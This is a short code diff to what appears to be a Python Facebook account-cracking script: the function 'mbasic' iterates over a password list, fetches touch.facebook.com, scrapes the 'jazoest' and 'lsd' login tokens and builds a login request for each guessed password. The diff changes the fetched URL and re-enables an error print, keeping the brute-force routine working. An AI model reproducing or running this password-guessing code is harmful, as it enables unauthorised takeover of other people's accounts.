@@ -1260,7 +1260,7 @@ def mbasic(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com/login').text #re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            free_fb = Session.get('https://touch.facebook.com').text #re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1329,7 +1329,7 @@ def mbasic(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        #print({error})
+        print({error})
         pass
 
 def p(uid,pwx,tl):
